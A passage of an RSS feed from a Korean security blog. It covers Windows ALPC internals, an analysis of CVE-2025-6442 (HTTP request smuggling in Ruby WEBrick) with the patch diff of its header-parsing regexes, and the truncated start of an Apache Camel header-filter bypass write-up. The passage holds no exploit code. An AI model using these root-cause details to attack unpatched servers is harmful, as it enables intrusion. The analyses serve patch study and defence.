&#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xBD80;&#xC5EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC11C;&#xBC84;&#xB294; &#xC774; &#xC18D;&#xC131;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xAC01; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC0C1;&#xD0DC; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC8E0;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_CONTEXT_ATTR</span> {</span>    PVOID PortContext;     <span class="hljs-comment">// &#xC774; &#xD3EC;&#xD2B8;(&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;)&#xC5D0; &#xBD99;&#xC5EC;&#xB454; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;</span>    PVOID MessageContext;  <span class="hljs-comment">// &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xBD99;&#xC5EC;&#xB454; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;</span>    ULONG Sequence;        <span class="hljs-comment">// &#xC2DC;&#xD000;&#xC2A4; &#xBC88;&#xD638;</span>    ULONG MessageId;       <span class="hljs-comment">// &#xBA54;&#xC2DC;&#xC9C0; ID</span>    ULONG CallbackId;      <span class="hljs-comment">// &#xCF5C;&#xBC31; ID</span>} ALPC_CONTEXT_ATTR, *PALPC_CONTEXT_ATTR;</code></pre><ul><li><code>PortContext</code><ul><li>&#xC11C;&#xBC84;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xD3EC;&#xD2B8;&#xC5D0; &#xC2EC;&#xC5B4;&#xB454; &#xAD6C;&#xC870;&#xCCB4; &#xD3EC;&#xC778;&#xD130; (&#xC138;&#xC158; ID, &#xC720;&#xC800; &#xC815;&#xBCF4; &#xB4F1;)</li></ul></li><li><code>MessageContext</code><ul><li>&#xD2B9;&#xC815; &#xBA54;&#xC2DC;&#xC9C0;&#xBCC4;&#xB85C; &#xBCC4;&#xB3C4; &#xC815;&#xBCF4; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC2F6;&#xC744; &#xB54C; &#xC0AC;&#xC6A9;</li></ul></li><li><code>Sequence</code> / <code>MessageId</code> / <code>CallbackId</code><ul><li>&#xCEE4;&#xB110;&#xC774; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC12;&#xB4E4;</li><li>TCP&#xCC98;&#xB7FC; &#x201C;&#xAD6C;&#xC870;&#xD654;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0; &#xCC98;&#xB9AC;&#x201D;&#xB97C; &#xD558;&#xAE30; &#xC704;&#xD55C; &#xAC1C;&#xB150; (&#xC694;&#xCCAD;&#x2013;&#xC751;&#xB2F5; &#xB9E4;&#xCE6D; &#xB4F1;)</li></ul></li></ul><hr><blockquote><p><strong>4. Handle &#xC18D;&#xC131;</strong></p></blockquote><p>&#xAC1D;&#xCCB4; &#xD578;&#xB4E4;&#xC744; &#xBA54;&#xC2DC;&#xC9C0;&#xC640; &#xD568;&#xAED8; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_MESSAGE_HANDLE_INFORMATION</span> {</span>    ULONG Index;        <span class="hljs-comment">// Attribute &#xBC84;&#xD37C; &#xB0B4; &#xC778;&#xB371;&#xC2A4;</span>    ULONG Flags;    ULONG Handle;       <span class="hljs-comment">// &#xB118;&#xAE30;&#xB824;&#xB294; &#xD578;&#xB4E4; &#xAC12; (sender &#xAE30;&#xC900;)</span>    ULONG ObjectType;   <span class="hljs-comment">// &#xAC1D;&#xCCB4; &#xD0C0;&#xC785;</span>    ACCESS_MASK GrantedAccess;<span class="hljs-comment">// &#xC218;&#xC2E0; &#xCE21;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xAD8C;&#xD55C;</span>} ALPC_MESSAGE_HANDLE_INFORMATION, *PALPC_MESSAGE_HANDLE_INFORMATION;</code></pre><ul><li>&#xCEE4;&#xB110;&#xC740; &#xD578;&#xB4E4;&#xC774; &#xC9C4;&#xC9DC; &#xC720;&#xD6A8;&#xD55C;&#xC9C0;, &#xAD8C;&#xD55C;&#xC740; &#xB9DE;&#xB294;&#xC9C0;, cross-process dup &#xC774; &#xAC00;&#xB2A5;&#xD55C;&#xC9C0; &#xAC80;&#xC0AC;</li><li>&#xC218;&#xC2E0;&#xC790;&#xB294; &#xC774; &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC790;&#xC2E0;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD578;&#xB4E4;&#xB85C; &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;</li></ul><h2 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h2><p><img src="image%2014.png" alt="image.png"></p><p>&#xC5EC;&#xAE30;&#xAE4C;&#xC9C0;&#xAC00; ALPC&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xD750;&#xB984;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!! &#xAC89;&#xC5D0;&#xC11C; &#xBCF4;&#xBA74; &#xADF8;&#xB0E5; IPC &#xD55C; &#xB369;&#xC5B4;&#xB9AC; &#xAC19;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB85C;&#xB294;</p><ul><li>&#xD3EC;&#xD2B8; &#xAC1D;&#xCCB4; &#xAD00;&#xB9AC;</li><li>PORT_MESSAGE &#xD5E4;&#xB354; &#xCC98;&#xB9AC;</li><li>&#xAC01;&#xC885; Attribute &#xD30C;&#xC2F1;</li><li>&#xC139;&#xC158; &#xBDF0; &#xB9E4;&#xD551;, &#xAD8C;&#xD55C; &#xAC80;&#xC99D;, &#xD578;&#xB4E4; &#xC911;&#xBCF5; &#xC0DD;&#xC131; &#xB4F1;</li></ul><p>&#xC774;&#xB7F0; &#xAC83;&#xB4E4;&#xC774; &#xD55C;&#xBC88;&#xC758; <code>NtAlpcSendWaitReceivePort()</code> &#xD638;&#xCD9C; &#xC548;&#xC5D0;&#xC11C; &#xB2E4; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;!!</p><p>&#xADF8;&#xB798;&#xC11C; &#xC2E4;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xB3C4; Attribute &#xD574;&#xC11D; &#xBC0F; &#xAC80;&#xC99D; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xD130;&#xC9C0;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;!</p><p>&#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; ALPC &#xAE30;&#xBC18; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xC124;&#xBA85;&#xB4DC;&#xB9AC;&#xACE0; &#xC2F6;&#xAD70;&#xC694;! &#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4; &#xB2E4;&#xC74C;&#xC5D0; &#xB9CC;&#xB098;&#xC694;~! &#x1F44B;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://ti.qianxin.com/blog/articles/the-tragedy-of-alpc-unknown-windows-privilege-escalation-nday-vulnerability-research-in-august-en/">https://ti.qianxin.com/blog/articles/the-tragedy-of-alpc-unknown-windows-privilege-escalation-nday-vulnerability-research-in-august-en/</a></p></li><li><p><a href="https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html">https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html</a></p></li><li><p><a href="https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html">https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html</a></p></li><li><p><a href="https://recon.cx/2008/a/thomas_garnier/LPC-ALPC-paper.pdf">https://recon.cx/2008/a/thomas_garnier/LPC-ALPC-paper.pdf</a></p></li><li><p><a href="https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape">https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape</a></p></li><li><p><a href="https://infocon.org/cons/SyScan/SyScan%202014%20Singapore/SyScan%202014%20presentations/SyScan2014_AlexIonescu_AllabouttheRPCLRPCALPCandLPCinyourPC.pdf">https://infocon.org/cons/SyScan/SyScan%202014%20Singapore/SyScan%202014%20presentations/SyScan2014_AlexIonescu_AllabouttheRPCLRPCALPCandLPCinyourPC.pdf</a></p></li><li><p><a href="https://en.wikipedia.org/wiki/Local_Inter-Process_Communication">https://en.wikipedia.org/wiki/Local_Inter-Process_Communication</a></p></li><li><p><a href="https://processhacker.sourceforge.io/doc/struct___a_l_p_c___s_e_c_u_r_i_t_y___a_t_t_r.html">https://processhacker.sourceforge.io/doc/struct___a_l_p_c___s_e_c_u_r_i_t_y___a_t_t_r.html</a></p></li><li><p><a href="https://ntdoc.m417z.com/">https://ntdoc.m417z.com/</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/IPC/">IPC</category>
      
      <category domain="https://hackyboiz.github.io/tags/gongjae/">gongjae</category>
      
      <category domain="https://hackyboiz.github.io/tags/ALPC/">ALPC</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-6442 : Ruby WEBrick의 HTTP Smuggling로 인한 Request 조작</title>
      <link>https://hackyboiz.github.io/2025/11/29/ji9umi/CVE-2025-6442/</link>
      <guid>https://hackyboiz.github.io/2025/11/29/ji9umi/CVE-2025-6442/</guid>
      <pubDate>Sat, 29 Nov 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/advisories/GHSA-r995-q44h-hr64&quot;&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/advisories/GHSA-r995-q44h-hr64">https://github.com/advisories/GHSA-r995-q44h-hr64</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>WEBrick &#x2264; 1.8.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p>WEBrick&#xC740; &#xAC04;&#xD3B8;&#xD558;&#xAC8C; HTTP &#xC6F9; &#xC11C;&#xBC84;&#xB97C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xB294; Ruby &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;. HTTP &#xBC0F; HTTPS &#xBAA8;&#xB450; &#xC9C0;&#xC6D0; &#xAC00;&#xB2A5;&#xD558;&#xBA70; Proxy, Virtual-Host &#xC11C;&#xBC84;&#xB85C; &#xD65C;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xBA87; &#xAC00;&#xC9C0; &#xC778;&#xC99D; &#xBC29;&#xC2DD; &#xB610;&#xD55C; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4; Ruby on Rails &#xBC0F; Pardino &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xAC1C;&#xBC1C; &#xC2DC; &#xD14C;&#xC2A4;&#xD2B8; &#xC11C;&#xBC84; &#xAD6C;&#xC131; &#xC2DC; &#xC790;&#xC8FC; &#xD65C;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-comment"># Source - https://stackoverflow.com/a</span><span class="hljs-comment"># Posted by pmagunia</span><span class="hljs-comment"># Retrieved 2025-11-28, License - CC BY-SA 3.0</span><span class="hljs-keyword">require</span> <span class="hljs-string">&apos;webrick&apos;</span>server = WEBrick::HTTPServer.new(<span class="hljs-symbol">:Port</span> =&gt; <span class="hljs-number">80</span>,                             <span class="hljs-symbol">:SSLEnable</span> =&gt; <span class="hljs-literal">false</span>,                             <span class="hljs-symbol">:DocumentRoot</span> =&gt; <span class="hljs-string">&apos;/var/www/myapp&apos;</span>,                             <span class="hljs-symbol">:ServerAlias</span> =&gt; <span class="hljs-string">&apos;myapp.example.com&apos;</span>)server.mount_proc <span class="hljs-string">&apos;/&apos;</span> <span class="hljs-keyword">do</span> <span class="hljs-params">|req, res|</span>  res.body = <span class="hljs-string">&apos;Hello, world!&apos;</span><span class="hljs-keyword">end</span>trap <span class="hljs-string">&apos;INT&apos;</span> <span class="hljs-keyword">do</span> server.shutdown <span class="hljs-keyword">end</span>server.start<span class="hljs-comment"># &#xC774;&#xD6C4; &#xD130;&#xBBF8;&#xB110;&#xC5D0;&#xC11C; `ruby &lt;filename&gt;.rb` &#xC2E4;&#xD589; &#xC2DC; &#xC811;&#xADFC; &#xAC00;&#xB2A5;</span><span class="hljs-comment"># $ curl http://127.0.0.1</span><span class="hljs-comment"># Hello, world!%</span></code></pre><p>CVE-2025-6442&#xC758; &#xD0C0;&#xC784;&#xB77C;&#xC778;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li>2023.09.13 &#x2014; Vendor&#xC5D0; &#xCDE8;&#xC57D;&#xC810; &#xC81C;&#xBCF4; (&#xB2F9;&#xC2DC; ZDI-CAN-21876&#xC73C;&#xB85C; &#xC2DD;&#xBCC4;)</li><li>2024.06.26 &#x2014; WEBrick github&#xC5D0;&#xC11C; RFC 9110 &#xB0B4;&#xC6A9;&#xC744; &#xC704;&#xBC18;&#xD558;&#xB294; &#xCF54;&#xB4DC; &#xD328;&#xD134;&#xC5D0; &#xAD00;&#xD55C; &#xC774;&#xC288; &#xC0DD;&#xC131; (&#xC774;&#xC288; &#xBC88;&#xD638; <code>#137</code>)</li><li>2024.07.02 &#x2014; &#xC9C0;&#xC801;&#xB41C; &#xC0AC;&#xD56D;&#xC758; &#xD328;&#xCE58; &#xBC0F; 1.8.2 &#xBC84;&#xC804;&#xC5D0;&#xC11C; merge</li><li>2025.06.26 &#x2014; &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4; &#xACF5;&#xAC1C;</li></ul><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xACBD;&#xC6B0; <strong>&#xB300;&#xC0C1; &#xC11C;&#xBC84;&#xAC00; &#xD2B9;&#xC815; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294; HTTP &#xD504;&#xB85D;&#xC2DC; &#xB4A4;&#xC5D0; &#xBC30;&#xCE58;&#xB41C; &#xACBD;&#xC6B0; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xAC00;&#xB2A5;</strong>&#xD558;&#xBA70; &#xBC1C;&#xC0DD; &#xC6D0;&#xC778;&#xC73C;&#xB85C;&#xB294; <strong>HTTP &#xD5E4;&#xB354;&#xC758; &#xC885;&#xB8CC; &#xBB38;&#xC790;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC77C;&#xAD00;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACB0;&#xACFC;</strong>&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC124;&#xBA85;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5F0;&#xAD00;&#xB41C; &#xCEE4;&#xBC0B; &#xB0B4;&#xC5ED;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC8FC;&#xC694; &#xBCC0;&#xACBD;&#xC740; <em>lib/webrick/httprequest.rb</em> &#xD30C;&#xC77C;&#xACFC; <em>lib/webrick/httputils.rb</em> &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xB41C; &#xC810;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB450; &#xD30C;&#xC77C;&#xC758; &#xBCC0;&#xACBD; &#xB0B4;&#xC5ED;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><blockquote><p>lib/webrick/httprequest.rb</p></blockquote><pre><code class="hljs ruby">      @request_time = Time.now---   <span class="hljs-keyword">if</span> /^(\S+)\s+(\S++)(?<span class="hljs-symbol">:</span>\s+HTTP\/(\d+\.\d+))<span class="hljs-string">?\r</span>?\n/mo =~ @request_line+++   <span class="hljs-keyword">if</span> /^(\S+) (\S++)(?: HTTP\/(\d+\.\d+))<span class="hljs-string">?\r\n</span>/mo =~ @request_line        @request_method = $1        @unparsed_uri   = $2        @http_version   = HTTPVersion.new($3 ? $3 : <span class="hljs-string">&quot;0.9&quot;</span>)@@ -<span class="hljs-number">471</span>,<span class="hljs-number">7</span> +<span class="hljs-number">471</span>,<span class="hljs-number">7</span> @@ <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_request_line</span><span class="hljs-params">(socket)</span></span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_header</span><span class="hljs-params">(socket)</span></span>      <span class="hljs-keyword">if</span> socket        <span class="hljs-keyword">while</span> line = read_line(socket)---       <span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> /\A(<span class="hljs-comment">#{CRLF}|#{LF})\z/om =~ line</span>+++       <span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> /\A<span class="hljs-comment">#{CRLF}\z/om =~ line</span>          <span class="hljs-keyword">if</span> (@request_bytes += line.bytesize) &gt; MAX_HEADER_LENGTH            raise HTTPStatus::RequestEntityTooLarge, <span class="hljs-string">&apos;headers too large&apos;</span>          <span class="hljs-keyword">end</span></code></pre><blockquote><p>lib/webrick/httputils.rb</p></blockquote><pre><code class="hljs ruby">      field = <span class="hljs-literal">nil</span>      raw.each_line{<span class="hljs-params">|line|</span>        <span class="hljs-keyword">case</span> line---     <span class="hljs-keyword">when</span> /^([A-Za-z<span class="hljs-number">0</span>-<span class="hljs-number">9</span>!\<span class="hljs-comment">#$%&amp;&apos;*+\-.^_`|~]+):(.*?)\z/om</span>---       field, value = $1, $2.strip+++     <span class="hljs-keyword">when</span> /^([A-Za-z<span class="hljs-number">0</span>-<span class="hljs-number">9</span>!\<span class="hljs-comment">#$%&amp;&apos;*+\-.^_`|~]+):([^\r\n\0]*?)\r\n\z/om</span>+++       field, value = $1, $2          field.downcase!          header[field] = HEADER_CLASSES[field].new <span class="hljs-keyword">unless</span> header.has_key?(field)          header[field] &lt;&lt; value---     <span class="hljs-keyword">when</span> /^\s+(.*?)/om---       value = line.strip+++     <span class="hljs-keyword">when</span> /^\s+([^\r\n\<span class="hljs-number">0</span>]*?)\r\n/om          <span class="hljs-keyword">unless</span> field            raise HTTPStatus::BadRequest, <span class="hljs-string">&quot;bad header &apos;<span class="hljs-subst">#{line}</span>&apos;.&quot;</span>          <span class="hljs-keyword">end</span>+++       value = line+++       value.lstrip!+++       value.slice!(-<span class="hljs-number">2</span>..-<span class="hljs-number">1</span>)          header[field][-<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; value        <span class="hljs-keyword">else</span>          raise HTTPStatus::BadRequest, <span class="hljs-string">&quot;bad header &apos;<span class="hljs-subst">#{line}</span>&apos;.&quot;</span></code></pre><p>&#xBCC0;&#xACBD;&#xB41C; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xD06C;&#xAC8C; &#xC815;&#xADDC;&#xC2DD; &#xD328;&#xD134; &#xC218;&#xC815;&#xACFC; <code>CR</code> &#xB610;&#xB294; <code>LF</code> &#xBB38;&#xC790;&#xAC00; &#xB2E8;&#xB3C5;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB358; &#xD328;&#xD134;&#xC744; <code>CR-LF</code> &#xD615;&#xD0DC;&#xB97C; &#xAC15;&#xC81C;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xAC00; &#xC9C4;&#xD589;&#xB41C; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xC0C1;&#xC801;&#xC778; &#xAD6C;&#xC870;&#xC758; HTTP &#xD328;&#xD0B7;&#xC758; &#xACBD;&#xC6B0; &#xD5E4;&#xB354; &#xC601;&#xC5ED;&#xACFC; &#xBC14;&#xB514; &#xC601;&#xC5ED;&#xC758; &#xAD6C;&#xBD84;&#xC744; &#xC704;&#xD574; <code>CR-LF</code> &#xBB38;&#xC790;&#xB97C; &#xB450; &#xBC88; &#xBC18;&#xBCF5;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xC694;&#xAD6C;&#xD558;&#xC9C0;&#xB9CC;, &#xAE30;&#xC874;&#xC758; &#xCF54;&#xB4DC;&#xB294; &#xC774;&#xB97C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xD558;&#xC9C0; &#xBABB;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="takeaway"><a href="#takeaway" class="headerlink" title="takeaway"></a>takeaway</h3><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810; &#xC678;&#xC5D0;&#xB3C4; &#xC790;&#xB8CC; &#xC870;&#xC0AC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; WEBrick&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; HTTP Smuggling &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xB2E4;&#xC218; &#xC874;&#xC7AC;&#xD558;&#xC600;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAC00;&#xAE09;&#xC801; &#xCD5C;&#xC2E0; &#xBCF4;&#xC548; &#xD328;&#xCE58;&#xAC00; &#xC801;&#xC6A9;&#xB41C; &#xBC84;&#xC804;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB418; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xACBD;&#xC6B0; &#xCDE8;&#xC57D;&#xD55C; &#xC124;&#xC815; &#xB4F1;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xB300;&#xC751;&#xC774; &#xD544;&#xC694;&#xD560; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>Explain<ul><li>background<ul><li><a href="https://en.wikipedia.org/wiki/WEBrick">https://en.wikipedia.org/wiki/WEBrick</a></li><li><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-414/">https://www.zerodayinitiative.com/advisories/ZDI-25-414/</a></li></ul></li><li>root cause<ul><li><a href="https://github.com/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101#diff-ad02984d873efb089aa51551bc6b7d307a53e0ba1ac439e91d69c2e58a478864">https://github.com/ruby/webrick/commit/ee60354bcb84ec33b9245e1d1aa6e1f7e8132101#diff-ad02984d873efb089aa51551bc6b7d307a53e0ba1ac439e91d69c2e58a478864</a></li><li><a href="https://github.com/ruby/webrick/pull/138">https://github.com/ruby/webrick/pull/138</a></li></ul></li><li>takeaway<ul><li><a href="https://hackerone.com/reports/965267">https://hackerone.com/reports/965267</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2020-25613">https://www.cve.org/CVERecord?id=CVE-2020-25613</a></li></ul></li></ul></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ji9umi/">ji9umi</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ruby/">Ruby</category>
      
      <category domain="https://hackyboiz.github.io/tags/WEBrick/">WEBrick</category>
      
      <category domain="https://hackyboiz.github.io/tags/HTTP-Sumggling/">HTTP Sumggling</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/29/ji9umi/CVE-2025-6442/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-27636 : Apache Camel의 Case-Sensitive Header Filtering Bypass로 인한 RCE</title>
      <link>https://hackyboiz.github.io/2025/11/26/clalxk/CVE-2025-27636/</link>
      <guid>https://hackyboiz.github.io/2025/11/26/clalxk/CVE-2025-27636/</guid>
      <pubDate>Wed, 26 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;&lt;strong&gt;URL&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.akamai.com/blog/security-res</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://www.akamai.com/blog/security-research/march-apache-camel-vulnerability-detections-and-mitigations"><strong>https://www.akamai.com/blog/security-research/march-apache-camel-vulnerability-detections-and-mitigations</strong></a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><ul><li>Apache Camel 4.10.0 &#x2264; 4.10.1</li><li>Apache Camel 4.8.0 &#x2264; 4.8.4</li><li>Apache Camel 3.10.0 &#x2264; 3.22.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Apache Camel&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C;, &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;, &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4; &#xAC04;&#xC758; &#xC6D0;&#xD65C;&#xD55C; &#xB370;&#xC774;&#xD130; &#xAD50;&#xD658;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD558;&#xBA70; &#xAD11;&#xBC94;&#xC704;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD1B5;&#xD569; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. </p><p>Apache Camel&#xC740; DefaultHeaderFilterStrategy.java&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB0B4;&#xBD80; &#xD5E4;&#xB354;(CamelHttpResponseCode, CamelHttpUri, CamelContextId, org.apache.camel.* &#xB4F1;)&#xAC00; &#xC678;&#xBD80;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xCC28;&#xB2E8;&#xD558;&#xC5EC; &#xBBFC;&#xAC10;&#xD55C; &#xB77C;&#xC6B0;&#xD305; &#xC815;&#xBCF4; &#xB204;&#xCD9C;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a><strong>Root Cause</strong></h3><p>Apache Camel&#xC758; &#xAE30;&#xBCF8; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;&#xC740; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xB294; 